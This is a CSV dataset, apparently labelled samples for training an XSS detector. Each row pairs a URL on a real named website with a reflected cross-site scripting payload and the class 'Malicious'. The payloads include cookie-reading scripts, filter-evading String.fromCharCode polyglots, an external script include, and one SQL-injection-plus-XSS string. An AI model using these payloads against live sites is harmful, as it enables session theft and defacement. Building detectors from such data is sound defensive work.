Payloads,Class
http://www.searchbv.nl/de/_system/formulieren/stuureenkennis.asp?pagetitle=&lt;script&gt;alert(&quot;scriptoriu<br>m(turkey)&quot;)&lt;/script&gt;,Malicious
http://www.videolan.org/mirror.php?mirror=http://downloads.videolan.org/pub/videolan/&amp;file=%22%3e%3c<br>script%3ealert(/scr34m/);%3c/script%3e,Malicious
http://www.imagens.de/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;<br>&lt;/marquee&gt;,Malicious
http://www.vanila.biz/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.kumaribank.com/contents/checking-account.html&amp;id=17&quot;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;,Malicious
http://www.mytv.de/search.html?q=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/scripts/hotpock<br>ets.js%3e,Malicious
http://www.rutv.ru/?d=0'%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.samuraisalvage.com/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.vertex.co.il/news_inthenews.asp?year=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3<br>e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://www.barattopoli.com/ricerca.php?ric=%22%3e%3cscript%3ealert%28document.cookie%29;%3c/script%3<br>e,Malicious
"http://football-regional.lesoir.be/live/index.php?compet=--%3e%3cscript%3ealert%28string.fromcharcod<br>e%2835,32,32,66,101,108,103,105,97,110,32,83,101,99,117,114,105,116,121,32,32,35%29%29%3c/script%3e",Malicious
http://www.salta.gob.ar/noticia-gobierno-salta.php?idnoticiasalta=%22%3e%3ciframe%20onload=alert%28/<br>xss/%29%3e,Malicious
http://invest.bnpparibas.com/en/glossary/default-print.asp?letter=%22%3e%3cscript%3ealert('by%20enco<br>re')%3c/script%3e,Malicious
"http://guides.lib.washington.edu/searchtags.php?iid=&amp;tag=';alert(string.fromcharcode(88,83,83))//\';<br>alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.fromch<br>arcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://trainingsupport.otte.vic.gov.au/skills_rec_tool/default.cfm?menu=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/s<br>cript&gt;,Malicious
http://www.orduunye.gov.tr/test/php/php_info.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e,Malicious
http://www.investors.com/ibdhelp/help.asp?page=59&amp;url=a%20href=help.asp?page=59&amp;backurl=a%20href=htt<br>p://www.google.com%22%3e%3cscript%3ealert('by-panzerturk')%3c/script%3e,Malicious
https://controlpanel.netfirms.com/en-us/cp_login_form.php?message=%3cimg%20src=%22http://img149.imag<br>eshack.us/img149/1232/logonj5.gif%22%20border=%220%22%20alt=%22xss%20pwned%20by%20guru%22%20/%3e%3cs<br>cript%3ealert('guru%20found%20xss%20-%20hacking-gurus.com')%3c/script%3e,Malicious
http://www.clubsaturday.nl/igallery33/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.pauta.com.br/busca_resultado.jsp;jsessionid=7d5c27fad0be3125b86cdd8b6194a216?txtbusca=%3c<br>script%3ealert%28%22fzero$rulez%22%29%3c/script%3e&amp;mas_codigo=0,Malicious
http://eskuel.sourceforge.net/eskuel/phpinfo.php?a[]=%3cscript%3ealert(123)%3c/script%3e,Malicious
http://www.missouri-miner.com/media/storage/paper426/news/2005/12/01/features/sub-brings.comics.for.<br>fridays.one.night.stand-1120027.shtml%7d%3c/style%3e%3cscript%3ea=eval%3bb=alert%3ba(b(/xss/.source)<br>)%3b%3c/script%3e%7d%3c/style%3e%3cscript%3ea=eval%3bb=alert%3ba(b(/xss/.source))%3b%3c/script%3e,Malicious
http://www.seila.gov.kh/english/job_en.asp?pgid=%22%3e%3cscript%3ealert(/xssed!/);%3c/script%3e,Malicious
http://www.secp.gov.pk/search.asp?target=%22%3egurus+here%3cscript%3ealert%28%27government+security+<br>nulled+by+neo%27%29%3c%2fscript%3e,Malicious
http://www.pole-lagunes.org/web/view_section.php?id_section=1085&amp;anchorname=1/&quot;&gt;&lt;script&gt;alert(1)&lt;/sc<br>ript&gt;,Malicious
http://www.bdguitar.net/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://archive.bitdefender.com/bd/site/products.php?p_id=-16%20union%20select%200,1,'%3cscript%3eale<br>rt(%22xss%20via%20sql%20by%20agd_scorp%22)%3c/script%3e',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/*",Malicious
http://ask.jp/trend/keyword.asp?o=0%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://www.hillsdale.edu/webapps/bookstore.shopping/shopcustadmin.asp?msg=%3cscript%3ealert('by<br>codes');%3c/script%3e,Malicious
http://www.arhiva.srbija.sr.gov.yu/pretrazivanje/dp_articles_search.php?startfrom=0&amp;searchtext=%22%3<br>e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%2<br>9%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3<br>e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e<br>%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%2520here%3c%<br>2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;category=-1&amp;andor=or&amp;date_from_d<br>ay=01&amp;date_from_month=01&amp;date_from_year=2001&amp;date_from=2001-01-01&amp;date_to_day=31&amp;date_to_month=10&amp;da<br>te_to_year=2007&amp;date_to=2007-10-31&amp;sort_by=date&amp;asc_desc=desc,Malicious
"http://www.sonyericsson.com/spg.jsp?cc=gb&amp;lc=';alert(string.fromcharcode(88,83,83))//\';alert(string<br>.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(8<br>8,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e<br>&amp;ver=4000&amp;template=ph1_3&amp;zone=ph",Malicious
